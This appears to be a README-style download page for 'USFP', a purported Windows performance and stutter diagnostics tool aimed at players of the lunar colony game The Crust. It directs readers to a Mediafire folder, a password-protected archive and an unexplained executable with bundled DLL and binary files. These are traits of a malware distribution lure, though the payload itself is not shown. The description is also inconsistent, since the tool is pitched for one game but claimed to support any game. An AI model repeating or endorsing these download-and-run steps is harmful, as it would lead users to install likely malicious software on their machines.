<div align="center">

# 🎮 The Crust

**Measure performance conditions with clear session data.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Known issues](#-known-issues) · [System Requirements](#-system-requirements) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

The Crust is a science-fiction simulation and strategy game set on the Moon. Players build and automate lunar colonies, manage resources and workers, and expand industrial operations through a story-driven campaign. Its systems become increasingly demanding as bases, factories, conveyors, and colonists grow.

Players of The Crust who want structured performance and stability data on Windows.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1465470/6b49560a41d482b94b641add052f3c31d1b73292/ss_6b49560a41d482b94b641add052f3c31d1b73292.1920x1080.jpg?t=1789543673" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1465470/ss_519b1f63f9243cce9437a3bd2622235825efa2d8.1920x1080.jpg?t=1789543673" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1465470/ff7deb21d6797101780136b72a9675a1db65ee0d/ss_ff7deb21d6797101780136b72a9675a1db65ee0d.1920x1080.jpg?t=1789543673" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known issues

- Frame rates can decline sharply in large or highly automated lunar bases.
- Simulation-heavy scenes may cause uneven frame pacing and brief stutters.
- Some sessions may experience freezes or crashes during extended play or autosaves.
- Save loading or recovery can become difficult after an interrupted save operation.
- Graphics settings may have limited effect when the main load comes from simulation activity.

## 🩺 How this tool helps

The tool records frame timing, process activity, startup parameters, and session events to help separate graphics load from simulation or scheduling limits. It can organize stability data, preserve recovery information, inspect graphics cache folders, and provide measured results for comparing changes. These functions support troubleshooting without changing game files.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Records frame-rate behavior during selected play sessions.
- 📊 **Stability Report + Session Recovery** — Summarizes session events and keeps recovery details after interruptions.
- 🎯 **Frame Timing Helper** — Charts frame intervals to identify stutter and pacing changes.
- ⚙️ **Startup Parameter Tool** — Stores and applies documented startup arguments for testing.
- 🧠 **Process Scheduling Helper** — Inspects process activity and records scheduling-related observations.
- 🧹 **Graphics Cache Utility** — Reviews and manages selected graphics cache folders.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- frame_data.pak <- display sync data
|-- fps_module.dll <- FPS module
|-- Password 2026.txt <- Password reminder (empty)
|-- core.bin <- Core runtime
|-- shader_cache.pak <- Shader cache data
|-- crash_reader.dll <- Crash log reader
|-- config.cfg <- User configuration
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.


---

<div align="center">
If this tool helped you, consider leaving a ⭐
</div>